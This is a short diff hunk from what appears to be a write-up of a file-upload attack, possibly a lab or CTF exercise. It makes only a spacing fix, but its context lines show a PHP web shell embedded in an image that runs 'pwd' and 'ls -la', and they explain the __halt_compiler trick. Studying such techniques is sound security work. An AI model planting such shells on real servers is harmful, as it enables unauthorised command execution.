@@ -62,7 +62,7 @@ Shell injected :
 <?php echo shell_exec("pwd"); echo shell_exec("ls -la"); __halt_compiler();
 ```
 
-The `__halt_compiler()`function call is there so that the image data doesn’t accidentally get interpreted as PHP and throw a parse error. This is why the output stops before outputting the actual image data
+The `__halt_compiler()` function call is there so that the image data doesn’t accidentally get interpreted as PHP and throw a parse error. This is why the output stops before outputting the actual image data
 
 It is successfully uploaded
 
